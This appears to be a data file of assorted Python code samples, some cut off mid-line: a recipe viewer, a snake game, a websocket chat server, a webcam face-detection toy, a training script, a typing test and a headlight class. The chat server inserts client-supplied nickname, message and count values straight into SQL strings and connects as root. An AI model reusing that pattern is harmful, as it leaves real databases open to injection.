    "import tkinter as tk\r\nfrom tkinter import messagebox\r\nfrom tkinter import scrolledtext\r\nfrom PIL import Image, ImageTk\r\nimport requests\r\nfrom deep_translator import GoogleTranslator\r\nfrom io import BytesIO\r\n\r\n\r\nclass Recipe:\r\n    def __init__(self, name, category, ingredients, instructions, image_url):\r\n        self.name = name\r\n        self.category = category\r\n        self.ingredients = ingredients\r\n        self.instructions = instructions\r\n        self.image_url = image_url\r\n\r\n\r\ncatalog = []\r\n\r\n\r\ndef get_recipe(texter): #\u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043d\u044f\u043c \u043d\u044f\u043c\r\n    url = 'https://www.themealdb.com/api/json/v1/1/'+texter\r\n    response = requests.get(url)\r\n\r\n    if response.status_code == 200:\r\n        data = response.json()\r\n        recipe_data = data['meals'][0]\r\n\r\n        name = recipe_data['strMeal']\r\n        category = recipe_data['strCategory']\r\n        ingredients = [recipe_data[f'strIngredient{i}'] for i in range(1, 21) if recipe_data[f'strIngredient{i}']]\r\n        instructions = recipe_data['strInstructions']\r\n        image_url = recipe_data['strMealThumb']\r\n\r\n        return Recipe(name, category, ingredients, instructions, image_url)\r\n    else:\r\n        return None\r\n\r\n\r\ndef translate_recipe(text): #\u043f\u0435\u0440\u0435\u0432\u043e\u0434\u0447\u0438\u043a\r\n    translated_text = GoogleTranslator(sourse=\"auto\", target=\"ru\").translate(text)\r\n    return translated_text\r\n\r\n\r\ndef add_recipe(category_recipe_id): # \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u043b\u043a\u0430 \u043f\u043e \u043a\u043e\u0434\u0443 \u0440\u0435\u0446\u0435\u043f\u0442\u0430 \u0447\u0435\u0440\u0435\u0437 \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u0438\r\n\r\n\r\n    for i in range(len(category_recipe_id)):\r\n        texter = \"lookup.php?i=\"+(str(category_recipe_id[i]))\r\n        recipe = get_recipe(texter)\r\n        if recipe:\r\n            catalog.append(recipe)\r\n            translated_name = translate_recipe(recipe.name)\r\n            lb_recipes.insert(tk.END, translated_name)\r\n            lbl_status.config(text=f\"\u0420\u0435\u0446\u0435\u043f\u0442 '{translated_name}' \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d \u0432 \u043a\u0430\u0442\u0430\u043b\u043e\u0433.\")\r\n        else:\r\n            messagebox.showerror(\"\u041e\u0448\u0438\u0431\u043a\u0430\", \"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0440\u0435\u0446\u0435\u043f\u0442 \u0441 \u0441\u0430\u0439\u0442\u0430\")\r\n\r\n\r\ndef add_random_recipe_to_catalog(): # \u0421\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0439 \u0440\u0435\u0446\u0435\u043f\u0442\r\n    texter = \"random.php\"\r\n    recipe = get_recipe(texter)\r\n    if recipe:\r\n        catalog.append(recipe)\r\n        translated_name = translate_recipe(recipe.name)\r\n        lb_recipes.insert(tk.END, translated_name)\r\n        lbl_status.config(text=f\"\u0420\u0435\u0446\u0435\u043f\u0442 '{translated_name}' \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d \u0432 \u043a\u0430\u0442\u0430\u043b\u043e\u0433.\")\r\n    else:\r\n        messagebox.showerror(\"\u041e\u0448\u0438\u0431\u043a\u0430\", \"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0440\u0435\u0446\u0435\u043f\u0442 \u0441 \u0441\u0430\u0439\u0442\u0430\")\r\n\r\n\r\ndef select_recipe_category(): # \u0412\u044b\u0431\u043e\u0440 \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u0438\r\n    def on_select():\r\n        category = v.get()\r\n        index_categories_recipe = categories_recipe_translated.index(category)\r\n\r\n\r\n        messagebox.showinfo(\"\u0412\u0430\u0448 \u0432\u044b\u0431\u043e\u0440\", f\"\u0412\u044b \u0432\u044b\u0431\u0440\u0430\u043b\u0438: {category}\")\r\n        category_window.destroy()\r\n        categories_recipe = [\"Beef\", \"Breakfast\", \"Chicken\", \"Dessert\", \"Goat\", \"Lamb\", \"Miscellaneous\",\r\n                             \"Pasta\", \"Pork\", \"Seafood\", \"Side\", \"Starter\", \"Vegan\", \"Vegetarian\"]\r\n        index_recipe = categories_recipe[int(index_categories_recipe)]\r\n        url = \"https://www.themealdb.com/api/json/v1/1/filter.php?c=\" + index_recipe\r\n        response = requests.get(url)\r\n        category_recipe_id = []\r\n        data = response.json()\r\n        for i in range(len(data[\"meals\"])):\r\n            recipe_data = data['meals'][i]\r\n            category_recipe_id.append(recipe_data[\"idMeal\"])\r\n        add_recipe(category_recipe_id)\r\n\r\n    category_window = tk.Toplevel(root, bg=\"#F6EFE4\")\r\n    category_window.config(width=45, height=31)\r\n    category_window.title(\"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044e\")\r\n\r\n    icon2 = ImageTk.PhotoImage(file='Subtract (1).png')\r\n    category_window.iconphoto(False, icon2)\r\n\r\n    categories_recipe_translated = [\"\u0413\u043e\u0432\u044f\u0434\u0438\u043d\u0430\", \"\u0417\u0430\u0432\u0442\u0440\u0430\u043a\", \"\u041a\u0443\u0440\u0438\u0446\u0430\", \"\u0414\u0435\u0441\u0435\u0440\u0442\", \"\u041a\u043e\u0437\u043b\u044f\u0442\u0438\u043d\u0430\", \"\u0411\u0430\u0440\u0430\u043d\u0438\u043d\u0430\", \"\u0420\u0430\u0437\u043d\u043e\u0435\",\r\n\"\u041f\u0430\u0441\u0442\u0430\", \"\u0421\u0432\u0438\u043d\u0438\u043d\u0430\", \"\u041c\u043e\u0440\u0435\u043f\u0440\u043e\u0434\u0443\u043a\u0442\u044b\", \"\u0413\u0430\u0440\u043d\u0438\u0440\", \"\u0417\u0430\u043a\u0443\u0441\u043a\u0430\", \"\u0412\u0435\u0433\u0430\u043d\u0441\u043a\u0438\u0439\", \"\u0412\u0435\u0433\u0435\u0442\u0430\u0440\u0438\u0430\u043d\u0441\u043a\u0438\u0439\"]\r\n    v = tk.StringVar()\r\n\r\n\r\n    for category in categories_recipe_translated:\r\n        tk.Radiobutton(category_window, text=category, bg=\"#F6EFE4\", font=(\"Corbel bold\", 20),\r\n                       variable=v, value=category).pack(anchor=\"w\")\r\n\r\n    ok_button = tk.Button(category_window, text=\"\u0412\u044b\u0431\u0440\u0430\u0442\u044c\", command=on_select, fg=\"#AC9075\",\r\n                          bg=\"#E8CAAC\", font=(\"Corbel bold\", 25))\r\n    ok_button.pack()\r\n\r\n\r\ndef view_selected_recipe(event): # \u0412\u044b\u0432\u043e\u0434\u0438\u0442 \u0440\u0435\u0446\u0435\u043f\u0442\u044b\r\n    index = lb_recipes.curselection()[0]\r\n    recipe = catalog[index]\r\n    translated_instructions = translate_recipe(recipe.instructions)\r\n    translated_ingredients = translate_recipe('\\n'.join(recipe.ingredients))\r\n    translated_category = translate_recipe(recipe.category)\r\n\r\n    lbl_recipe.insert(\"1.0\", f\"\u041a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044f: {translated_category}\\n\\n\u0418\u043d\u0433\u0440\u0435\u0434\u0438\u0435\u043d\u0442\u044b:\\n{translated_ingredients}\\n\\n\u0418\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u044f: {translated_instructions}\")\r\n\r\n    image_response = requests.get(recipe.image_url)\r\n    image = Image.open(BytesIO(image_response.content))\r\n    image.thumbnail((500, 500))\r\n    photo = ImageTk.PhotoImage(image)\r\n    lbl_image.config(image=photo)\r\n    lbl_image.image = photo\r\n\r\n\r\n# \u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0433\u0440\u0430\u0444\u0438\u0447\u0435\u0441\u043a\u0438\u0439 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\r\nroot = tk.Tk(",
    "import pygame,random\nfrom sys import exit\npygame.display.init()\npygame.font.init()\npygame.display.set_caption('Snake Game')\nhighscore =0\nScreen=[680,680] \nnew = True\nfont = pygame.font.SysFont(' Monospace',70)\nfont2 = pygame.font.SysFont(' Mono',30)\nclock = pygame.time.Clock()             \nscreen = pygame.display.set_mode(((Screen[0],Screen[1]+100)))\nfont1 = pygame.font.SysFont('Comic Sans',43)\ndef gameover():\n    time =0\n    while True:\n        key = pygame.key.get_pressed()\n        if time > 500:\n            text1 = font1.render('PRESS SPACE TO PLAY AGAIN',1,(0,0,0))\n            screen.blit(text1,(25,Screen[1]//2-100))\n            if key[pygame.K_SPACE]:\n                Game_Over = False\n                return Game_Over\n        for event in pygame.event.get():\n                if event.type == pygame.QUIT:\n                    exit()\n        text = font.render('GAME  OVER',1,(0,0,0))\n        screen.blit(text,(Screen[0]//2-200,Screen[1]//2-200))\n        clock.tick(60)\n        time+=clock.tick(60)\n        pygame.display.update()\ndef Score():\n    score_text = font2.render(f'Score:{score}',1,(0,0,0))\n    Logo = font2.render(f'\\nSnake Game\\n',1,(0,0,0))\n    highscore_text = font2.render(f'HScore:{highscore}',1,(0,0,0))\n    screen.blit(highscore_text,(350,690))\n    screen.blit(Logo,(200,725))\n    screen.blit(score_text,(0,690))\ndef SetUP():\n    global Game_Over,new,direction,snake,snake_pos,snake_quantaty,t_p,vel,vel_y,snake_tail_list,Screen,tiles,VEL,snake_pos_tail,apple_pos,border\n    VEL = 20\n    vel = VEL\n    vel_y = VEL\n    Game_Over = False\n    new = True\n    snake_pos = [(Screen[0]//VEL)*(VEL//2),(Screen[1]//VEL)*(VEL//2)]#[x,y]\n    snake_quantaty= -1\n    direction = 'N'\n    #U-UP,N-Neutral,D-DOWN,L-LEFT,R-RIGHT\n    apple_pos =[]\n    pygame.mouse.set_visible(False)\n    tiles=[]\n    snake = pygame.Rect(snake_pos[0],snake_pos[1],VEL,VEL)\n    for h in range(Screen[0]//VEL):\n        for w in range(Screen[1]//VEL):\n                p =[VEL*(h),VEL*w]\n                p1 =[VEL*(h),VEL*w]\n                tiles.append(p)\n                apple_pos.append(p1)\n    border = pygame.Rect(0,740,Screen[0],100)\n    snake_pos_tail=[]\ndef main(): \n    global Game_Over,direction,snake,new,snake_quantaty,snake_pos,vel,vel_y,border,highscore,score\n    SetUP()\n    while True:\n        key = pygame.key.get_pressed()\n        FPS = 11\n        if Game_Over == False:\n            for event in pygame.event.get():\n                if event.type == pygame.QUIT:\n                    exit()\n            if key[pygame.K_UP]:\n                if not direction == 'D':\n                            direction = 'U'\n            if key[pygame.K_DOWN]:\n                if not direction == 'U':\n                            direction = 'D'\n            if key[pygame.K_RIGHT]:\n                if not direction == 'L':\n                            direction = 'R'\n            if key[pygame.K_LEFT]:\n                if not direction == 'R':\n                            direction = 'L'\n            for p in tiles[:]:\n                pygame.draw.rect(screen,('WHITE'),pygame.Rect(p[0],p[1],20,20),)\n                pygame.draw.rect(screen,(00,0,0),pygame.Rect(p[0],p[1],20,20),1)\n            border = pygame.Rect(0,680,Screen[0],100)\n            borderleft = pygame.Rect(Screen[0],0,VEL,Screen[1])\n            if direction=='U':\n                snake_pos[1]-=vel_y\n            if direction=='D':\n                snake_pos[1]+=vel_y\n            if direction=='R':\n                snake_pos[0]+=vel\n            if direction=='L':\n                snake_pos[0]-=vel\n            if snake_pos[0]<0 or snake_pos[0]>Screen[0]:\n                vel = 0\n                if snake_pos[0]<0:\n                    snake_pos[0]=0\n                if snake_pos[0]>Screen[0]:\n                    snake_pos[0]=Screen[0]-VEL\n                vel_y=0\n                snake_pos_tail.clear()\n                Game_Over = True\n                \n            if snake.y<0:\n                snake.y=0\n                vel =0\n                vel_y=0 \n                snake_pos_tail.clear()\n                Game_Over = True\n            if new == True:\n                random.shuffle(apple_pos)\n                for p1 in apple_pos[:]:\n                    apple = pygame.Rect(p1[0],p1[1],VEL,VEL)\n                    new = False\n            snake_pos2 = [snake.x,snake.y]\n            snake_pos_tail.append(snake_pos2)\n            pygame.draw.rect(screen,(100,0,0),apple)\n            if snake.colliderect(apple):\n                new = True\n                snake_quantaty += 1\n            score = snake_quantaty+1\n            if len(snake_pos_tail)-1 > snake_quantaty:\n                del snake_pos_tail[0]\n            for x in snake_pos_tail:\n                pygame.draw.rect(screen,(0,100,0),(x[0],x[1],VEL,VEL))\n                if snake_quantaty >0:\n                    if x == snake_pos:\n                        vel = 0\n                        vel_y = 0\n                        Game_Over = True\n            if score>=3 and score<6:\n              ",
    "import asyncio\nimport time\n\nimport websockets\nimport pymysql as sql\nimport json\nimport ssl\n\ndatabase_url = 'localhost'\nclients = {}\n\n\ndef debug(content):\n    ifDebug = True\n    if ifDebug:\n        print(f\"\\033[33mDebug:{content}\\033[0m\")\n\n\n# \u548c\u6570\u636e\u5e93\u4ea4\u4e92\nclass DB:\n    def __init__(self):\n        # \u8fde\u63a5\u5230\u6570\u636e\u5e93\n        f = open(\"passwd\")\n        passwd = f.read().strip()\n        f.close()\n        db = sql.connect(host=\"localhost\", user=\"root\", password=passwd, database='chatchannel', charset='utf8')\n        cursor = db.cursor()\n        cursor.execute('use chatchannel;')\n        self.cursor = cursor\n\n    def pull_message(self, count):\n        cursor = self.cursor\n        cursor.execute(f'select * from storage order by id desc limit {count};')\n        data = cursor.fetchall()\n        # \u5c06data\u8f6c\u6362\u4e3a\u7c7bJSON\u5217\u8868\n        result = []\n        for i in range(0, len(data)):\n            result.append({\n                'nickname': data[i][1],\n                'message': data[i][2],\n                'timestamp': data[i][3].strftime('%Y-%m-%d %H:%M:%S')\n            })\n        # debug(type(result[1]['timestamp']))\n        # result = str(result)\n        return result\n\n    def post_message(self, nickname, message):\n        cursor = self.cursor\n        debug(f\"\u5c1d\u8bd5\u8fd0\u884c\u6570\u636e\u5e93\u6307\u4ee4insert into storage (nickname, message) values ('{nickname}', '{message}');\")\n        cursor.execute(f\"insert into storage (nickname, message) values ('{nickname}', '{message}');\")\n        cursor.execute(\"commit;\")  # \u6b64\u5904\u9700\u8981commit\u624d\u80fd\u751f\u6548\n\n\ndatabase = DB()\n\n\ndef client_del(client):\n    global clients\n    clients.pop(client.self_id)\n    del client\n\n\n# database.post_message(\"zhangsan\", \"HELLO\")\nclass WebSocketClient:\n    ws_core = None  # ws_core\u662f\u4e00\u4e2a\u53ef\u904d\u5386\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u7528\u6765\u63a5\u6536\u6d88\u606f\n    self_id = None\n\n    # self_clock = 10  # 10\u79d2\u6ca1\u6536\u5230ping\u5305\u5c31\u8ba4\u4e3a\u6389\u7ebf\n\n    async def client_start(self):\n        debug(\"WebSocket client start\")\n\n    def __init__(self, websocket, self_id):\n        self.ws_core = websocket\n        self.self_id = self_id\n        asyncio.ensure_future(self.client_start())\n\n    async def send(self, raw_message):  # \u6b64\u5904raw_message\u662f\u5b57\u5178\n        await self.ws_core.send(json.dumps(raw_message))\n        debug(f\"Sent client ws message: {raw_message}\")\n\n    async def on_message(self, raw_message):  # \u6b64\u5904raw_message\u662f\u5b57\u5178\n        message = raw_message\n        debug(f\"Received client ws message: {message}\")\n        if message[\"method\"] == \"ping\":\n            print(\"\u65b0\u8fde\u63a5\u5efa\u7acb\")\n        # on_websocket_send \u5b9a\u4e49\u6709\u4ee5\u4e0b\u65b9\u6cd5pull push update\n        elif message[\"method\"] == \"pull\":\n            count = message[\"pullNum\"]\n            result = {\"method\": \"pull\", \"data\": database.pull_message(count)}\n            debug(f\"pull_message: {result}\")\n            await self.send(result)  # \u8fd9\u91cc\u6570\u636e\u53d1\u4e0d\u51fa\u53bb\n            return result\n        elif message[\"method\"] == \"push\":\n            debug(\"pushing\")\n            data = message[\"data\"]\n            nickname = data[\"nickname\"]\n            message = data[\"message\"]\n            database.post_message(nickname, message)\n            await send_update_to_all()\n        elif message[\"method\"] == \"ping\":\n            debug(\"ping\")\n            await self.send(json.dumps({\"method\": \"ping\", \"data\": \"pong!!\"}))  # \u672a\u5b9e\u73b0\n\n\nasync def check_online():\n    global clients\n    time = len(clients)\n    del_clients = []\n    for i in range(0, time):\n        debug('\u68c0\u6d4b\u662f\u5426\u5728\u7ebf')\n        client = clients[i]\n        try:\n            await client.send({\n                \"method\": \"ping\"\n            })\n        except Exception:\n            del_clients.append(i)\n            continue\n    for i in range(0, len(del_clients)):\n        clients.pop(i)\n    debug(f\"\u5df2\u5220\u9664\uff1a{len(del_clients)}\u4e2a\u79bb\u7ebf\u5ba2\u6237\u7aef\")\n\n\nasync def send_update_to_all():\n    global clients\n    del_id_list = []\n    for key in clients:\n        client = clients[key]\n        debug(f\"\u5c1d\u8bd5\u5e7f\u64ad\")\n        try:\n            await client.send({\n                \"method\": \"update\",\n                \"data\": database.pull_message(1)\n            })\n        except Exception as ConnectionClosedOK:\n            debug(f\"\u5ba2\u6237\u7aef\u5df2\u65ad\u5f00\u8fde\u63a5: {ConnectionClosedOK}\")\n            del_id_list.append(key)\n            continue\n        except Exception as e:\n            debug(f\"\u672a\u77e5\u9519\u8bef: {e}\")\n            del_id_list.append(key)\n            continue\n    for del_id in del_id_list:\n        clients.pop(del_id)\n    debug(f\"\u5df2\u5220\u9664\uff1a{len(del_id_list)}\u4e2a\u79bb\u7ebf\u5ba2\u6237\u7aef\")\n\n\n# async def on_message(message, client):\n#     message = json.loads(message)  # \u5c06\u6536\u5230\u7684JSON\u6570\u636e\u8f6c\u6362\u4e3a\u5b57\u5178\n#     debug(f\"Received client ws message: {message}\")\n#     if message[\"method\"] == \"ping\":\n#         print(\"\u65b0\u8fde\u63a5\u5efa\u7acb\")\n#     # on_websocket_send \u5b9a\u4e49\u6709\u4ee5\u4e0b\u65b9\u6cd5pull push update\n#     elif message[\"method\"] == \"pull\":\n#         count = message[\"pullNum\"]\n#         result = {\"method\": \"pull\", \"data\": database.pull_message(count)}\n#         debug(f\"pull_message: {result}\")\n#         await client.send(json.dumps(result))  # \u8fd9\u91cc\u6570\u636e\u53d1\u4e0d\u51fa\u53bb\n#         return result\n#     elif message[\"method\"] == \"push\":\n#         debug(\"pushing\")\n#         data = message[\"data\"]\n#         nickname = data[\"nickname\"]\n#         message = data[\"mes",
    "import cv2 as cv\nimport random\n\n# Open the default webcam\ncap = cv.VideoCapture(0)\n\n# Load the pre-trained face detection model\nface_cascade = cv.CascadeClassifier(cv.data.haarcascades + 'haarcascade_frontalface_default.xml')\n\nframe_count = 0\nmax_training_frames = 200\n\n# Flag to indicate if training is completed\ntraining_completed = False\n\n# Flag to indicate if face recognition model is loaded\nmodel_loaded = False\n\n# Random number to display on the rectangle\nrandom_number = random.randint(50, 100)\n\nwhile True:\n    # Read the frame from the webcam\n    ret, frame = cap.read()\n\n    # Increment frame count\n    frame_count += 1\n\n    if not training_completed:\n        # Convert the frame to grayscale for face detection\n        gray = cv.cvtColor(frame, cv.COLOR_BGR2GRAY)\n\n        # Detect faces in the grayscale frame\n        faces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5)\n\n        # Train facial recognition model using the first 200 frames\n        if frame_count <= max_training_frames:\n            for (x, y, w, h) in faces:\n                # Crop the face region\n                face_roi = gray[y:y+h, x:x+w]\n\n                # Draw rectangle around the face for training visualization\n                cv.rectangle(frame, (x, y), (x+w, y+h), (255, 0, 0), thickness=2)\n\n                # Display the frame with training rectangles\n                cv.imshow('Training Faces', frame)\n\n        # After 200 frames, mark training as completed and load the face recognition model\n        if frame_count == max_training_frames:\n            training_completed = True\n            print(\"Training completed.\")\n            # Load the face recognition model (this step is usually done here, but in this example, we're skipping it)\n            # model = load_model()\n\n    else:\n        # Use the trained facial recognition model after training is completed\n        # Convert the frame to grayscale for face detection\n        gray = cv.cvtColor(frame, cv.COLOR_BGR2GRAY)\n\n        # Detect faces in the grayscale frame\n        faces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5)\n\n        for (x, y, w, h) in faces:\n            # Draw rectangle around the detected face\n            cv.rectangle(frame, (x, y), (x+w, y+h), (0, 255, 0), thickness=2)\n            \n            # Draw the random number inside the rectangle\n            cv.putText(frame, 'Rizz Level: ' + str(random_number), (x, y - 10), cv.FONT_HERSHEY_SIMPLEX, 0.9, (36, 255, 12), 2)\n\n        # Display the frame with rectangles and text\n        cv.imshow('Detected Faces', frame)\n\n    # Wait for 'q' key to exit the loop and close the window\n    if cv.waitKey(1) & 0xFF == ord('q'):\n        break\n\n# Release the capture object and close all windows\ncap.release()\ncv.destroyAllWindows()",
    "import argparse\r\nimport os, sys\r\nimport os.path as osp\r\nimport torchvision\r\nimport numpy as np\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.optim as optim\r\nfrom torchvision import transforms\r\nimport network_new\r\nfrom network_new import *\r\nfrom torch.utils.data import DataLoader\r\nfrom data_list import ImageList, ImageList_idx\r\nimport random, pdb, math, copy\r\nfrom loss import *\r\nimport torch.nn.functional as F\r\nfrom utils import *\r\n\r\n\r\ndef op_copy(optimizer):\r\n    for param_group in optimizer.param_groups:\r\n        param_group['lr0'] = param_group['lr']\r\n    return optimizer\r\n\r\n\r\ndef lr_scheduler(optimizer, iter_num, max_iter, gamma=10, power=0.75):\r\n    decay = (1 + gamma * iter_num / max_iter) ** (-power)\r\n    for param_group in optimizer.param_groups:\r\n        param_group['lr'] = param_group['lr0'] * decay\r\n        param_group['weight_decay'] = 5e-4\r\n        param_group['momentum'] = 0.9\r\n        param_group['nesterov'] = True\r\n    return optimizer\r\n\r\n\r\ndef data_load(args):\r\n    train_transform = transforms.Compose([\r\n        transforms.Resize((256, 256)),\r\n        transforms.RandomCrop(224),\r\n        transforms.RandomHorizontalFlip(),\r\n        transforms.ToTensor(),\r\n        torchvision.transforms.Normalize([0.485, 0.456, 0.406], [0.229, 0.224, 0.225]),\r\n    ])\r\n    test_transform = transforms.Compose([\r\n        transforms.Resize((256, 256)),\r\n        transforms.CenterCrop(224),\r\n        transforms.ToTensor(),\r\n        torchvision.transforms.Normalize([0.485, 0.456, 0.406], [0.229, 0.224, 0.225]),\r\n    ])\r\n    ## prepare data\r\n    dsets = {}\r\n    dset_loaders = {}\r\n    train_bs = args.batch_size\r\n    txt_tar = open(args.t_dset_path).readlines()\r\n    txt_test = open(args.test_dset_path).readlines()\r\n\r\n    dsets[\"target\"] = ImageList_idx(txt_tar, transform=train_transform)\r\n    dset_loaders[\"target\"] = DataLoader(\r\n        dsets[\"target\"],\r\n        batch_size=train_bs,\r\n        shuffle=True,\r\n        num_workers=args.worker,\r\n        drop_last=False,\r\n    )\r\n    num_examp = len(dsets[\"target\"])\r\n    dsets[\"test\"] = ImageList(txt_test, transform=test_transform)\r\n    dset_loaders[\"test\"] = DataLoader(\r\n        dsets[\"test\"],\r\n        batch_size=train_bs * 3,\r\n        shuffle=False,\r\n        num_workers=args.worker,\r\n        drop_last=False,\r\n    )\r\n\r\n    return dset_loaders, num_examp\r\n\r\n\r\ndef print_args(args):\r\n    s = \"==========================================\\n\"\r\n    for arg, content in args.__dict__.items():\r\n        s += \"{}:{}\\n\".format(arg, content)\r\n    return s\r\n\r\n\r\ndef train_target_mme(args):\r\n    dset_loaders, num_examp = data_load(args)\r\n    ## set base network\r\n\r\n    netG = network_new.ResBase(res_name=args.net).cuda()\r\n    netF = network_new.bottleneck(type=args.classifier, feature_dim=netG.in_features, bottleneck_dim=args.bottleneck).cuda()\r\n    netC = network_new.classifier_C(type=args.layer, class_num=args.class_num, bottleneck_dim=args.bottleneck).cuda()\r\n    netD = network_new.classifier_D(type=args.layer, feature_dim=netG.in_features, class_num=args.class_num).cuda()\r\n\r\n    args.modelpath = args.output_dir_src + \"/source_G\" + \".pt\"\r\n    netG.load_state_dict(torch.load(args.modelpath))\r\n    args.modelpath = args.output_dir_src + \"/source_F\" + \".pt\"\r\n    netF.load_state_dict(torch.load(args.modelpath))\r\n    args.modelpath = args.output_dir_src + \"/source_C\" + \".pt\"\r\n    netC.load_state_dict(torch.load(args.modelpath))\r\n    args.modelpath = args.output_dir_src + \"/source_D\" + \".pt\"\r\n    netD.load_state_dict(torch.load(args.modelpath))\r\n\r\n    netC.eval()\r\n    netD.train()\r\n\r\n    for k, v in netC.named_parameters():\r\n        v.requires_grad = False\r\n\r\n    param_group_g = []\r\n    param_group_d = []\r\n\r\n    learning_rate = args.lr\r\n    for k, v in netG.named_parameters():\r\n        param_group_g += [{\"params\": v, \"lr\": learning_rate * 0.3}]\r\n    for k, v in netF.named_parameters():\r\n        param_group_g += [{\"params\": v, \"lr\": learning_rate * 1.0}]\r\n    for k, v in netD.named_parameters():\r\n        param_group_d += [{\"params\": v, \"lr\": learning_rate * 1.0}]\r\n\r\n    # optimizer_g = optim.SGD(param_group_g, momentum=0.9, weight_decay=5e-4, nesterov=True)\r\n    # optimizer_d = optim.SGD(param_group_d, momentum=0.9, weight_decay=5e-4, nesterov=True)\r\n\r\n    optimizer_g = optim.SGD(param_group_g)\r\n    optimizer_d = optim.SGD(param_group_d)\r\n\r\n    optimizer_g = op_copy(optimizer_g)\r\n    optimizer_d = op_copy(optimizer_d)\r\n\r\n    iter_num = 0\r\n    iter_target = iter(dset_loaders[\"target\"])\r\n    max_iter = (args.max_epoch) * len(dset_loaders[\"target\"])\r\n    interval_iter = max_iter // args.interval\r\n    # len(dset_loaders[\"target\"]) = 16\r\n\r\n    while iter_num < max_iter:\r\n        try:\r\n            inputs_test, _, tar_idx = iter_target.next()\r\n            # inputs_test.size---->torch.Size([bs, 3, 224, 224])\r\n            # _ \u8868\u793a\u7684\u662f\u4e0d\u53ef\u83b7\u5f97\u7684label,\u517164\u4e2a=batch-size\r\n            # tar_idx \u8868\u793a\u7684\u662f\u7d22\u5f15\r\n        except:\r\n            iter_target = iter(dset_loaders[\"target\"])\r\n            inputs_test, _, tar_idx = iter_targ",
    "import curses\r\nfrom curses import wrapper\r\nimport time\r\nimport random\r\n\r\n\r\ndef start_screen(stdscr):\r\n    stdscr.clear()\r\n    stdscr.addstr(\"Welcome to the Speed Typing Test!\")\r\n    stdscr.addstr(\"\\nPress any key to begin!\")\r\n    stdscr.refresh()\r\n    stdscr.getkey()\r\n\r\n\r\ndef display_text(stdscr, target, current, wpm):\r\n    stdscr.addstr(target)\r\n    stdscr.addstr(1, 0, f\"WPM: {wpm}\")\r\n\r\n    for i, char in enumerate(current):\r\n        correct_char = target[i]\r\n        color = curses.color_pair(1)\r\n        if char != correct_char:\r\n            color = curses.color_pair(2)\r\n        stdscr.addstr(0, i, char, color)\r\n\r\n\r\n\r\ndef get_text():\r\n    with open(\"random_text.txt\", \"r\") as f:\r\n        lines = f.readlines()\r\n\r\n    return random.choice(lines).strip()\r\n\r\n\r\ndef wpm_test(stdscr):\r\n\r\n    target_text = get_text()\r\n    current_text = []\r\n    wpm = 0\r\n    start_time = time.time()\r\n    stdscr.nodelay(True)\r\n    while True:\r\n        time_elapsed = max(time.time() - start_time, 1)\r\n        wpm = round((len(current_text) / (time_elapsed / 60)) / 5)\r\n        stdscr.clear()\r\n        display_text(stdscr, target_text, current_text, wpm)\r\n        stdscr.refresh()\r\n\r\n        if \"\".join(current_text) == target_text:\r\n            stdscr.nodelay(False)\r\n            break\r\n\r\n        try:\r\n            key = stdscr.getkey()\r\n        except:\r\n            continue\r\n\r\n        if ord(key) == 27:\r\n            break\r\n        if key in (\"KEY_BACKSPACE\", '\\b', \"\\x7f\"):\r\n            if len(current_text) > 0:\r\n                current_text.pop()\r\n        elif len(current_text) < len(target_text):\r\n            current_text.append(key)\r\n\r\n\r\ndef main(stdscr):\r\n    curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)\r\n    curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)\r\n    curses.init_pair(3, curses.COLOR_WHITE, curses.COLOR_BLACK)\r\n    while True:\r\n        start_screen(stdscr)\r\n        wpm_test(stdscr)\r\n\r\n        stdscr.addstr(2, 0, \"You completed the test! press any key to continue....\")\r\n        key = stdscr.getkey()\r\n        if ord(key) == 27:\r\n            break\r\n\r\n\r\nwrapper(main)\r\n",
    "class HeadLight:\r\n    def __init__(self, sun_light = 0.5):\r\n        self.chance_to_night = sun_light\r\n        self.is_light_on = True\r\n        self.is_light_off = True\r\n        self.is_a_day = False\r\n        self.is_a_night = True\r\n\r\n    def light_turned_on(self, chance_to_night):\r\n        if self.is_a_night:\r\n            print(\"Head lights are turned on!\")\r\n            return self.is_light_off\r\n        \r\n        elif chance_to_night > self.chance_to_night:\r\n            print(\"Head light turned on!\")\r\n            return self.is_light_on\r\n        \r\n        else:\r\n\r\n            return not self.is_light_on\r\n        \r\n\r\n    def light_turned_off(self, chance_to_morning):\r\n        if self.is_a_day:\r\n            print(\"Lights are Turned off!\")\r\n\r\n        elif chance_to_morning < self.chance_to_night:\r\n            print(\"Head light turned off!\")\r\n            return self.is_light_off\r\n        \r\n        else:\r\n\r\n            return not self.is_light_off\r\n        \r\n        \r\nhead = HeadLight()\r\nhead.light_turned_on(0.4)\r\nhead.light_turned_off(0.4)\r\n        ",
